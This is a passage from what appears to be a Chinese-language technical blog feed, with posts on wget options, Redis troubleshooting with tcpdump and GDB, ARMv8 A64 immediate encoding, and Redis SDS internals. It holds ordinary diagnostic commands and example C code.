<p>其中各参数意义可通过<code>wget -h</code>查看，如下：</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -h</span><br><span class="line">...</span><br><span class="line">-c,  --continue                  resume getting a partially-downloaded file</span><br><span class="line">-r,  --recursive                 specify recursive download</span><br><span class="line">-np, --no-parent                 don&#x27;t ascend to the parent directory</span><br><span class="line">-k,  --convert-links             make links in downloaded HTML or CSS point to local files</span><br><span class="line">-L,  --relative                  follow relative links only</span><br><span class="line">-p,  --page-requisites           get all images, etc. needed to display HTML page</span><br><span class="line">-A,  --accept=LIST               comma-separated list of accepted extensions</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>wget</category>
      </categories>
      <tags>
        <tag>wget</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis抓包分析案例</title>
    <url>/2021/11/06/2021-11-06-one-redis-case/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p><strong>业务背景：</strong> 有一台由多个Docker容器组成的仿真设备环境，1个Docker部署Redis服务端，剩余每个Docker都作为Redis客户端，用于模拟一块单板。</p>
<p><strong>问题：</strong> 仿真设备启动中，<strong>概率出现Redis的某个字符串键被不符合预期地改写成空串</strong>，导致客户端Docker从Redis获取的数据有问题。<strong>需要定位是哪个Docker上的哪个进程改写了Redis数据库。</strong></p>
<span id="more"></span>

<h2 id="定位思路"><a href="#定位思路" class="headerlink" title="定位思路"></a>定位思路</h2><ul>
<li>先尝试排查客户端代码。但此案例中涉及业务代码过多(200w+行代码)，且Redis客户端的形式也很多（有<code>goredis</code>, <code>redis-py</code>, <code>hiredis</code>, <code>redis-cli</code>等）。看来肉眼扫描代码的笨方法不靠谱，而且这种<strong>寄希望于碰运气蒙混过关</strong>的思考方式实在不像是一个程序员。</li>
</ul>
<p>那么既然排查客户端有困难，能不能换个角度思考，比如说从服务端入手？以下给出第二种思路：</p>
<ul>
<li><strong>通过在服务端抓包，得到所有对这个字符串键做set操作的报文，再根据报文中的IP和端口号得到进程ID</strong>。听起来可行，下面举一个简化的案例介绍具体的操作方法。</li>
</ul>
<h2 id="具体方法"><a href="#具体方法" class="headerlink" title="具体方法"></a>具体方法</h2><p>利用tcpdump，在Redis服务端后台抓取对这个字符串键做set操作的报文，再根据报文中的IP和端口号确认进程即可。</p>
<p>如下图所示，使用命令<code>tcpdump -i any port 6379 | grep set | grep [key]</code> ，得到客户端IP是localhost,端口号是44880。 </p>
<p><img src="/2021/11/06/2021-11-06-one-redis-case/image1.png"></p>
<p>再根据报文中的IP和端口号确认进程号，可以用<code>netstat</code>, <code>ss</code>, <code>lsof</code>等实现。以下仅给出<code>netstat</code>方式，命令：<code>netstat -anltp | grep 端口号</code>，得到进程ID为6748，如下图所示：<br><img src="/2021/11/06/2021-11-06-one-redis-case/image2.png"></p>
<h4 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h4><p>如果我只需要抓取将某个特定字符串键（比如”hello”）写成<strong>某个特定值</strong>（比如写成空串）的报文，怎么做？</p>
<p>除了<code>grep</code>，下面再给出一种方法，利用<strong>tcpdump的根据报文特征过滤</strong>的技巧：</p>
<p>1、使用tcpdump的-X选项查看报文详细内容，重点看Redis请求在TCP报文中是如何存储的：<br><img src="/2021/11/06/2021-11-06-one-redis-case/image3.png"></p>
<p>可以看出, <code>set hello &quot;world&quot;</code>命令在报文中存储的协议内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*3 $3 set $5 hello $5 world</span><br></pre></td></tr></table></figure>

<p>协议内容的解析参考<a href="https://redis.io/topics/protocol">Redis协议规范（RESP）</a> ， 以下只做简单的解释：</p>
<ul>
<li>*3 表示数组长度为3， 数组元素依次为 [“set” “hello” “world”]</li>
<li>$3 表示字符串 “set” 的长度</li>
<li>第一个 $5 表示字符串 “hello” 的长度。</li>
<li>第二个 $5 表示字符串 “world” 的长度。</li>
</ul>
<p>2、再根据TCP报文内容的特征过滤。此案例中，筛选条件可以是同时匹配 “set” “hello” “$0”(<strong>0匹配键值的长度，用来匹配空串</strong>），可以使用命令<code>tcpdump -i any port 6379 -X and &#39;ip[60:2] == 0x7365&#39; and &#39;ip[69:4] == 0x68656c6c&#39; and &#39;ip[76:2] == 0x2430&#39;</code> 抓取所有将字符串键”hello”写为空串的报文，参考下图：<br><img src="/2021/11/06/2021-11-06-one-redis-case/image4.png"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】<a href="https://redis.io/topics/protocol">Redis协议规范（RESP）</a></p>
<p>【2】<a href="https://wizardforcel.gitbooks.io/network-basic/content/17.html">网络基本功（十八）：细说tcpdump的妙用（下）</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>ARMv8 A64汇编中立即数范围问题分析</title>
    <url>/2021/11/21/2021-11-21-armv8-a64-immediate-num-range-analyse/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p><strong>ARMv8 A64汇编中，立即数是如何表示的？不同的指令对于立即数的表示有差异吗？</strong></p>
<p>在Stackoverflow上发现类似的讨论：<a href="https://stackoverflow.com/questions/30904718/range-of-immediate-values-in-armv8-a64-assembly">https://stackoverflow.com/questions/30904718/range-of-immediate-values-in-armv8-a64-assembly</a></p>
<span id="more"></span>

<p>问题复现：（环境： <code>Linux debian 4.19.0-10-amd64</code>)</p>
<p>1、编写 <code>hello.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD X12, X10, 0xFEF</span><br><span class="line">AND X12, X10, 0xFEF</span><br></pre></td></tr></table></figure>

<p>如果你是<code>x86_64</code>环境，需先安装<code>aarch64</code>编译工具：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install binutils-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>

<p>2、编译<code>hello.s</code>，发现对于相同立即数<code>0xFEF</code>，<font color='red'>AND指令编译出<code>immediate out of range</code>错，但ADD指令编译却不出错，<strong>为什么？？?</strong></font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># aarch64-linux-gnu-as hello.s -o hello.o</span><br><span class="line">hello.s: Assembler messages:</span><br><span class="line">hello.s:1: Error: immediate out of range at operand 3 -- `and x12,x10,0xfef&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>查询ARMv8指令集手册(<code>C4.1 A64 instruction set encoding</code>)，先来看下A64 指令集编码格式：<br><img src="/2021/11/21/2021-11-21-armv8-a64-immediate-num-range-analyse/image1.png"></p>
<p>可以看出<strong>A64指令长度固定为32位，其中op0(占4位)用于区分不同类型的指令，剩下的28位也不可能全用于表示立即数</strong>。因此，和x86&#x2F;x64这种变长指令集对比，A64中立即数表示范围非常有限。</p>
<p>解释这个问题，需要查询指令集手册，对比ADD, AND指令的立即数编码格式差异。</p>
<h3 id="ADD-immediate"><a href="#ADD-immediate" class="headerlink" title="ADD(immediate)"></a>ADD(immediate)</h3><p>ADD指令的编码格式和伪码，可以参考手册 <code>C6.2.4 ADD(immediate)</code>，或下图：<br><img src="/2021/11/21/2021-11-21-armv8-a64-immediate-num-range-analyse/image2.png"></p>
<ul>
<li><p><code>imm12</code>表示立即数，长度12位，范围0~4095，共4096种取值。</p>
</li>
<li><p>读伪代码可知，<code>sh</code>取值为1时，将<code>imm12</code>左移12位得到立即数。因此又有0 &lt;&lt; 12, 1 &lt;&lt; 12, 2 &lt;&lt; 12, … 4095 &lt;&lt; 12 共4096种取值。前后加起来一共8192种取值。</p>
</li>
<li><p>此例中<font color = 'red'><strong>0xFEF &#x3D; 4079，显然落在0~4095范围内，所以ADD指令编译不出问题。</strong></font></p>
</li>
</ul>
<p>利用<code>objdump</code>查看<code>ADD X12, X10, 0xFEF</code> 指令的二进制码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># aarch64-linux-gnu-objdump -d hello.o</span><br><span class="line">Disassembly of section .text:</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   913fbd4c        add     x12, x10, #0xfef</span><br></pre></td></tr></table></figure>

<p> <code>0x913fbd4c</code> &#x3D; <code>1001 0001 0011 1111 1011 1101 0100 1100</code> b， 可以看出这条ADD指令的编码和指令集手册规定的编码格式是一致的。（各字段对应的关系参考上图）</p>
<h3 id="AND-immediate"><a href="#AND-immediate" class="headerlink" title="AND(immediate)"></a>AND(immediate)</h3><p>AND指令的编码格式和伪码参考手册 <code>C6.2.12 AND(immediate)</code>，或下图：<br><img src="/2021/11/21/2021-11-21-armv8-a64-immediate-num-range-analyse/image3.png"><br><img src="/2021/11/21/2021-11-21-armv8-a64-immediate-num-range-analyse/image4.png"></p>
<p>AND指令的伪码不是很直观，详细解释参考老外的这篇<a href="https://dinfuehr.github.io/blog/encoding-of-immediate-values-on-aarch64/">文章</a>，非常清楚（参考<code>Logical Immediates</code>小节）</p>
<p><strong>这里给出直观的结论：</strong></p>
<p>AND指令支持的立即数个数为5334个，结果参考：<a href="https://gist.github.com/dinfuehr/51a01ac58c0b23e4de9aac313ed6a06a">full output</a></p>
<p>对于AND指令支持的立即数a，必定能通过如下方式得到：</p>
<ul>
<li><p>首先，一定能找到一个长度为n的二进制模式串s（n要求必须是2 , 4,  8, 16, 32, 64 中的一个）。</p>
</li>
<li><p>且模式串s必须由 m个连续的1组成的二进制串(这个串长度也是n，m要求必须在[1, n - 1]之间) 通过循环右移任意次数得到。</p>
</li>
<li><p>最后将这个n位的模式串s拼接 64 &#x2F; n 次，得到1个64位的二进制串，它的值等于a。</p>
</li>
</ul>
<p><strong>N, imms, immr字段的作用：</strong></p>
<p><code>N</code> 和 <code>imms</code>共同决定<strong>二进制模式串s的长度</strong>，以及<strong>模式串s有几个连续的1</strong>。</p>
<p><code>immr</code>： r即rotate，表示模式串s的循环右移次数，范围 0 ~ 63。</p>
<p>N和imms的取值组合参考下表：</p>
<table>
<thead>
<tr>
<th>N</th>
<th>imms</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>模式串长度</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>x</td>
<td>2 位</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>x</td>
<td>x</td>
<td>4 位</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>8 位</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>0</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>16 位</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>32 位</td>
</tr>
<tr>
<td>1</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>64 位</td>
</tr>
</tbody></table>
<p>对于给定的<code>N</code>和<code>imms</code>，<strong>x可以取0或1，但不允许所有的x同时取1</strong>，因此对于n位的模式串，x的取值组合有 n - 1种情况。</p>
<p>以下举几个例子帮助理解：</p>
<ul>
<li><p><code>N</code> &#x3D; 0 <code>imms</code> &#x3D; <strong>1 1 1 0</strong> <font color = 'red'><strong>1 0</strong></font>， 表示模式串长度为4，且模式串中连续1的个数为 10 ‘b + 1 &#x3D; 3，即 0111。此时<code>immr</code>的范围[0, 3]</p>
<ul>
<li><code>immr</code> &#x3D; 0， 表示立即数为 0111 0111 0111 0111  0111 0111 0111 0111  0111 0111 0111 0111  0111 0111 0111 0111 &#x3D; 0x7777777777777777</li>
<li><code>immr</code> &#x3D; 2, 表示模式串循坏右移2次 （0111 -&gt; 1101)，立即数为 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 &#x3D; 0xdddddddddddd</li>
</ul>
</li>
<li><p><code>N</code> &#x3D; 0 <code>imms</code> &#x3D; <strong>1 1 1 1 0</strong> <font color = 'red'><strong>0</strong></font>，表示模式串长度为2，且模式串中连续1的个数为 0 ‘b + 1 &#x3D; 1，即 01。此时<code>immr</code>的范围[0, 1]</p>
<ul>
<li><code>immr</code> &#x3D; 0，表示立即数 01 01 …… 01 b(连续32个01组成)，即 0x5555555555555555</li>
<li><code>immr</code> &#x3D; 1，表示模式串循坏右移1次（01 -&gt; 10），立即数 10 10 ……  10 b(连续32个10组成)，即 0xaaaaaaaaaaaaaaaa</li>
</ul>
</li>
</ul>
<p>可以看出：</p>
<ul>
<li><p>对于长度为n位的模式串，连续1的个数可以是[1, n - 1]，又因为s位模式串循环右移任意次数是[0, n -1]，所以一共拼接出 n * (n - 1)个不同的立即数。</p>
</li>
<li><p>长度n的取值由N和imms共同决定，取值范围 {2, 4, 8, 16, 32, 64}</p>
</li>
</ul>
<p>综上， AND指令支持的立即数总数为 2 * 1 + 4 * 3 + 8 * 7 + …… + 64 * 63 &#x3D; 5334。</p>
<p>可以手撕代码，打印出这5334个符合条件的立即数，参考：<a href="https://dinfuehr.github.io/blog/encoding-of-immediate-values-on-aarch64/">https://dinfuehr.github.io/blog/encoding-of-immediate-values-on-aarch64/</a></p>
<p>回到问题， 0xfef的二进制串为1111 1110 1111，你会发现 <font color ='red'><strong>N, imms, immr不管取什么值，都无法得到1111 1110 1111这个串，所以AND指令的编译会报错</strong></font>。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】<a href="https://developer.arm.com/documentation/ddi0487/latest/arm-architecture-reference-manual-armv8-for-armv8-a-architecture-profile">《ARM Architecture Reference Manual, for ARMv8-A architecture profile》</a></p>
<p>【2】  <a href="https://dinfuehr.github.io/blog/encoding-of-immediate-values-on-aarch64/">ENCODING OF IMMEDIATE VALUES ON AARCH64</a></p>
]]></content>
      <categories>
        <category>Assembly</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Assembly</tag>
      </tags>
  </entry>
  <entry>
    <title>如何查看Redis订阅的模式字符串</title>
    <url>/2021/11/21/2021-11-21-how-to-lookup-redis-pattern-string/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p><code>pubsub channels</code>可以查看Redis中被订阅的频道(<strong>channel</strong>)：</p>
<span id="more"></span>
<p><img src="/2021/11/21/2021-11-21-how-to-lookup-redis-pattern-string/image1.png"></p>
<p><code>pubsub numpat</code>可以查看被订阅的模式(<strong>pattern</strong>)数量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># redis-cli pubsub numpat</span><br><span class="line">(integer) 3</span><br></pre></td></tr></table></figure>

<p><strong>问题：</strong></p>
<p>除了查看被订阅模式的数量，我还需要<font color = 'red'><strong>获取每个订阅模式字符串的内容</strong></font>，怎么做 ?</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>google没搜到现成的命令，决定自己修改<code>redis-server</code>源码，打印模式链表的内容，用时3~5分钟，需要了解：</p>
<ul>
<li><p>Redis源码编译方法，参考<a href="https://github.com/redis/redis">官网</a>或本人的<a href="https://blog.csdn.net/pcj_888/article/details/106483567">博客</a></p>
</li>
<li><p>Redis服务器将所有模式的订阅信息保存在服务器状态的<code>pubsub_patterns</code>链表中。</p>
</li>
</ul>
<h4 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h4><p>1、下载Redis源码（这里用的是6.0.9版本的源码，<a href="https://github.com/redis/redis/releases/tag/6.0.9">下载链接</a>），修改<code>pubsub.c</code>，自定义一个模式链表打印函数<code>myPubsubPatternsPrint</code>，实现参考如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pubsub.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">myPubsubPatternsPrint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">list</span> *l = server.pubsub_patterns;</span><br><span class="line">    listNode *cur = l-&gt;head;</span><br><span class="line">    serverLog(LL_NOTICE, <span class="string">&quot;[DEBUG] ALL PUBSUB PATTERNS: &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        pubsubPattern *pp = (pubsubPattern *)(cur-&gt;value);</span><br><span class="line">        robj *obj = pp-&gt;pattern;</span><br><span class="line">        <span class="type">char</span> *pattern = (<span class="type">char</span> *)obj-&gt;ptr;</span><br><span class="line">        serverLog(LL_NOTICE, <span class="string">&quot;%s&quot;</span>, pattern);</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、重新编译并安装redis-server，后台gdb call一下自定义的打印函数<code>myPubsubPatternsPrint</code>得到模式链表的内容，如下图所示：<br><img src="/2021/11/21/2021-11-21-how-to-lookup-redis-pattern-string/image2.png"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】《Redis设计与实现》 第18章 发布与订阅</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Hiredis查询失败时出现key丢失问题定位</title>
    <url>/2021/11/30/2021-11-30-redis-key-expired-case/</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>hiredis查询key失败后，出现key丢失的问题。</p>
<p>REDIS版本及源码：<a href="https://github.com/redis/redis/releases/tag/6.0.10">6.0.10</a></p>
<p>hiredis版本及源码：<a href="https://github.com/redis/hiredis/releases/tag/v1.0.2">v1.0.2</a></p>
<span id="more"></span>

<p><strong>案例描述：</strong></p>
<p>REDIS中预先写入1个字符串键”hello”，客户端代码基于hiredis，创建100个读线程和100个写线程，每个线程里发起一次短连接读写key，代码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;hiredis/hiredis.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERV_IP <span class="string">&quot;127.0.0.1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERV_PORT 6379</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_READER 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_WRITER 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> OK = <span class="number">0</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">DBGetString</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *key, <span class="type">char</span> *value)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">    tv.tv_sec = <span class="number">5</span>; tv.tv_usec = <span class="number">0</span>;</span><br><span class="line">    redisContext *c = redisConnectWithTimeout(SERV_IP, SERV_PORT, tv);</span><br><span class="line">    assert(c != <span class="literal">NULL</span> &amp;&amp; !c-&gt;err);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;GET %s&quot;</span>, key);</span><br><span class="line">    redisReply *reply = (redisReply *)redisCommand(c, cmd);</span><br><span class="line">    assert(reply-&gt;str != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(value, reply-&gt;str);</span><br><span class="line">    freeReplyObject(reply);</span><br><span class="line">    redisFree(c);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">DBSetString</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *key, <span class="type">const</span> <span class="type">char</span> *value)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">    tv.tv_sec = <span class="number">5</span>; tv.tv_usec = <span class="number">0</span>;</span><br><span class="line">    redisContext *c = redisConnectWithTimeout(SERV_IP, SERV_PORT, tv);</span><br><span class="line">    assert(c != <span class="literal">NULL</span> &amp;&amp; !c-&gt;err);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;SET %s %s&quot;</span>, key, value);</span><br><span class="line">    redisReply *reply = (redisReply *)redisCommand(c, cmd);</span><br><span class="line">    freeReplyObject(reply);</span><br><span class="line">    redisFree(c);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">Reader</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    DBGetString(<span class="string">&quot;hello&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">Writer</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    DBSetString(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testcase</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">time_t</span> t1 = time(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">pthread_t</span> wid[NUM_WRITER];</span><br><span class="line">    <span class="type">pthread_t</span> rid[NUM_READER];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_WRITER; ++i) &#123;</span><br><span class="line">        pthread_create(&amp;wid[i], <span class="literal">NULL</span>, Writer, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_READER; ++i) &#123;</span><br><span class="line">        pthread_create(&amp;rid[i], <span class="literal">NULL</span>, Reader, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_WRITER; ++i) &#123;</span><br><span class="line">        pthread_join(wid[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_READER; ++i) &#123;</span><br><span class="line">        pthread_join(rid[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">time_t</span> t2 = time(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%ld s\n&quot;</span>, t2 - t1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    testcase();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="定位思路"><a href="#定位思路" class="headerlink" title="定位思路"></a>定位思路</h3><p>Redis key丢失一般有如下原因：</p>
<ul>
<li>key被客户端删除。</li>
<li>key是过期键，到期自动删除。</li>
<li>因为内存不足导致key被逐出。</li>
</ul>
<p>本案例中的客户端只有get,set，没有删除操作，未设置键的过期时间，且机器内存也足够（4G以上）。初步分析不出原因，只能结合REDIS源码正向定位，于是有了第二种思路：</p>
<p><em><strong>REDIS是基于内存的数据库，字符串键肯定在REDIS-SERVER进程中的某个内存地址处，key丢失时这个地址的内容肯定被改写，这时只需要GDB打个数据断点，看下调用栈即可分析原因。</strong></em></p>
<p>以下给出详细的定位过程。</p>
<h3 id="定位过程"><a href="#定位过程" class="headerlink" title="定位过程"></a>定位过程</h3><p>1、使用GCC的-g -O0编译选项，重新编译redis-server, hiredis源代码。（这一步非必要，目的是更方便调试）</p>
<p>2、GDB打数据断点<br><img src="/2021/11/30/2021-11-30-redis-key-expired-case/image1.png"></p>
<p>3、断点触发，观察调用栈<br><img src="/2021/11/30/2021-11-30-redis-key-expired-case/image2.png"></p>
<p>观察第5帧，<code>freeMemoryIfNeeded</code>，说明触发了REDIS的内存淘汰机制，GDB打印出的REDIS配置项<code>maxmemory</code>仅为1048576字节(表示内存大小为1M)，且内存淘汰机制为<code>allkeys-lru</code>，这个机制会导致key被回收。</p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>修改redis配置项maxmemory，内存给多点。（这里给1073741824，表示1G内存）</p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(一)——简单动态字符串</title>
    <url>/2021/12/11/2021-12-11-redis-note-01-sds/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Redis是用C语言开发的，但并没有直接使用C语言数组去表示字符串，而是使用简单动态字符串(Simple dynamic String，简称SDS)作为字符串的底层实现。</p>
<p>以下给出SDS相关的一些常见问题，通过源码分析和实际验证，思考这些问题的答案，了解实现原理和设计思路。</p>
<span id="more"></span>

<p><strong>源码版本：</strong></p>
<p><a href="https://github.com/redis/redis/releases/tag/3.0.0">Redis 3.0.0</a></p>
<p><a href="https://github.com/redis/redis/releases/tag/6.0.10">Redis 6.0.10</a></p>
<h2 id="思考问题"><a href="#思考问题" class="headerlink" title="思考问题"></a>思考问题<span id="jump0"></span></h2><ul>
<li><a href="#jump1">SDS的数据结构，字符串如何表示的</a><ul>
<li><a href="#jump2">SDS结构体各成员的作用</a></li>
<li><a href="#jump3">创建给定C字符串的SDS场景，sdshdr结构体各成员初值是多少</a></li>
</ul>
</li>
<li><a href="#jump4">SDS相较于C风格字符串的优点</a><ul>
<li><a href="#jump5">SDS的空间分配策略是如何杜绝缓冲区溢出问题的</a></li>
<li><a href="#jump6">SDS是如何减少修改字符串时带来的内存重分配次数</a><ul>
<li><a href="#jump7">字符串增长场景，SDS扩容策略</a></li>
<li><a href="#jump8">字符串缩短场景，SDS空间释放策略</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#jump9">SDS最大长度是多少</a></li>
<li><a href="#jump10">字符串键的三种编码方式</a><ul>
<li><a href="#jump11">int编码</a></li>
<li><a href="#jump12">embstr编码</a></li>
<li><a href="#jump13">raw编码</a></li>
<li><a href="#jump14">设计embstr编码的用意是什么</a></li>
<li><a href="#jump15">三种编码之间的转换规则</a></li>
</ul>
</li>
<li><a href="#jump16">对于很短的字符串，并不需要4字节表示长度，REDIS 3.2中的SDS实现是如何优化，节约内存的</a><ul>
<li><a href="#jump17">给定一个长度为n的sds，它的底层通过哪个sdshdr类型表示？</a></li>
</ul>
</li>
<li><a href="#jump18">REDIS字符串命令</a></li>
</ul>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="SDS的数据结构，字符串是如何表示的"><a href="#SDS的数据结构，字符串是如何表示的" class="headerlink" title="SDS的数据结构，字符串是如何表示的 "></a>SDS的数据结构，字符串是如何表示的 <span id="jump1"></span></h3><p>REDIS 3.0中，SDS的数据结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> len;		<span class="comment">// 字符串长度，即对C风格字符串调用strlen的结果</span></span><br><span class="line">	<span class="type">int</span> <span class="built_in">free</span>;		<span class="comment">// buf数组中的未使用字节数</span></span><br><span class="line">	<span class="type">char</span> buf[];		<span class="comment">// &#x27;\0&#x27;结尾</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注意sizeof(struct sdshdr)的结果等于8，不是9；这里的buf为柔性数组成员。至于为什么用柔性数组成员可以参考这篇文章：<a href="https://www.cnblogs.com/davygeek/p/5748852.html">https://www.cnblogs.com/davygeek/p/5748852.html</a></p>
